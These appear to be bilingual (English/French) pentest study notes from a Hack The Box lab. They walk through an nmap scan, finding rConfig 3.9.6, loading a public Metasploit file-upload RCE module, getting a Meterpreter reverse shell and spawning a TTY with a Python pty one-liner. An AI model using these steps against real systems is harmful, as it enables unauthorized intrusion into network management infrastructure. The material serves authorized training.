# Infiltrating Unix/Linux

***

### <mark style="color:red;">Common Considerations</mark>

* What distribution of Linux is the system running?
* What shell & programming languages exist on the system?
* What function is the system serving for the network environment it is on?
* What application is the system hosting?
* Are there any known vulnerabilities?

***

### <mark style="color:red;">Gaining a Shell Through Attacking a Vulnerable Application</mark>

<mark style="color:green;">**Enumerate the Host**</mark>

```bash
mrroboteLiot@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

`What information could we gather from the output?`

* Le système écoute sur les ports **80 (HTTP), 443 (HTTPS), 3306 (MySQL), et 21 (FTP)** → probablement un **serveur web avec application hébergée**.
* Informations récupérées : **Apache 2.4.6**, **PHP 7.2.34**, et distribution **Linux CentOS**.
* Avant de se lancer dans des recherches approfondies, il est conseillé de **naviguer vers l’IP via un navigateur** pour identifier l’application hébergée et mieux orienter l’analyse.
* Ces observations aident à choisir le **vecteur d’attaque ou de test** le plus pertinent pour l’exploitation ou le pentest.

<mark style="color:green;">**rConfig Management Tool**</mark>

![image](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

{% hint style="danger" %}
Here we discover a network configuration management tool called [rConfig](https://www.rconfig.com). This application is used by network & system administrators to automate the process of configuring network appliances. One practical use case would be to use rConfig to remotely configure network interfaces with IP addressing information on multiple routers simultaneously. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.
{% endhint %}

***

### <mark style="color:red;">Discovering a Vulnerability in rConfig</mark>

* En bas de la page de connexion, repérer la version : **rConfig 3.9.6**.
* Utiliser cette version comme point de départ pour rechercher **CVE**, exploits publics et PoC.
* Lors de la recherche, lire attentivement chaque résultat et comprendre exactement ce que fait l’exploit/PoC.
* L’objectif final est d’identifier quelque chose qui pourrait conduire à une **session shell** sur la cible (si autorisé).
* Mots‑clés utiles pour la recherche : **`rConfig 3.9.6 vulnerability`**.

![image](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)

<mark style="color:green;">**Search For an Exploit Module**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```
{% endcode %}

* La recherche mène au code source d’un module d’exploit nommé **rconfig\_vendors\_auth\_file\_upload\_rce.rb**.
* Ce module permet d’obtenir une **shell** sur une machine Linux exécutant **rConfig 3.9.6**.
* Si `msfconsole` ne le trouve pas localement, on peut **télécharger/coller** le fichier du repo sur notre machine d’attaque.
* Placer le fichier dans le **répertoire des modules Metasploit** utilisé par votre installation (pour qu’il soit détecté par MSF).
* Lancer `msfconsole`, **recharger** les modules si nécessaire, puis `use` le module et configurer les options pour l’exécution.

<mark style="color:green;">**Locate**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ locate exploits
```

* Repérer les répertoires des modules Metasploit sur la machine (sur Pwnbox : `/usr/share/metasploit-framework/modules/exploits`).
* Copier le code de l’exploit dans un sous‑répertoire approprié, par ex. `/usr/share/metasploit-framework/modules/exploits/linux/http`, en gardant la même organisation que sur le dépôt GitHub.
* Sauvegarder le fichier avec l’extension `.rb` (tous les modules Metasploit sont écrits en Ruby).
* Télécharger le fichier depuis GitHub avec `wget` ou coller le code manuellement dans le fichier local.
* Mettre Metasploit à jour via le gestionnaire de paquets (ex. `apt update; apt install metasploit-framework`) ou la méthode propre à votre distro.
* Après avoir ajouté le module, recharger/relancer Metasploit pour qu’il détecte le nouveau fichier, puis `use` le module et configurer les options.
* Toujours n’effectuer ces actions que dans un cadre **autorisé et légal** (pentest avec consentement explicite).

***

### <mark style="color:red;">Using the rConfig Exploit and Gaining a Shell</mark>

<mark style="color:green;">**Select an Exploit**</mark>

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

With this exploit selected, we can list the options, input the proper settings specific to our network environment, and launch the exploit.

Use what you have learned in the module thus far to fill out the options associated with the exploit.

<mark style="color:green;">**Execute the Exploit**</mark>

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
```

We can see from the steps outlined in the exploitation process that this exploit:

* Checks for the vulnerable version of rConfig
* Authenticates with the rConfig web login
* Uploads a PHP-based payload for a reverse shell connection
* Deletes the payload
* Leaves us with a Meterpreter shell session

<mark style="color:green;">**Interact With the Shell**</mark>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>meterpreter > shell
</strong></code></pre>

***

### <mark style="color:red;">Spawning a TTY Shell with Python</mark>

* **Non‑TTY = shell limité** : pas d’invite, peu d’interactivité (pas de job control, éditeurs interactifs inutilisables).
* **Cause courante** : le payload s’est lancé sous un compte système (ex. `apache`) qui n’a pas d’environnement interactif complet.
* **Conséquences pratiques** : certaines commandes interactives ou d’élévation (`su`, `sudo`, éditeurs, raccourcis clavier) peuvent ne pas fonctionner correctement.
* **Vérifier la présence d’outils** : on peut contrôler si un interpréteur (ex. Python) est installé — information utile pour la suite.
* **Solution conceptuelle** : si un interpréteur est présent, on peut demander à ce dernier d’allouer une vraie pseudo‑TTY (pty) pour améliorer l’interactivité — ceci nécessite des étapes techniques.
* **Alternatives sûres** : utiliser des sessions gérées (ex. Meterpreter) ou refaire l’exercice dans un lab (HTB, VulnHub, etc.) pour éviter tout risque sur des cibles non autorisées.

<mark style="color:green;">**Interactive Python**</mark>

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

This command uses python to import the [pty module](https://docs.python.org/3/library/pty.html), then uses the `pty.spawn` function to execute the `bourne shell binary` (`/bin/sh`). We now have a prompt (`sh-4.2$`) and access to more system commands to move about the system as we please.

{% hint style="warning" %}
Lorsqu'un payload est exécuté, par exemple via un serveur web (comme Apache), il est exécuté dans le contexte de l'utilisateur qui exécute le serveur. Dans ce cas, cela pourrait être l'utilisateur **apache**. Cet utilisateur n'a souvent pas un accès complet au système et peut ne pas avoir une **shell interactive** par défaut. En fait :

* **Absence d'une configuration d'environnement adéquate** : L'utilisateur Apache n'a pas nécessairement les mêmes variables d'environnement que les utilisateurs normaux, ce qui signifie que des shells comme `/bin/bash` ou `/bin/sh` peuvent ne pas se comporter comme prévu.
{% endhint %}
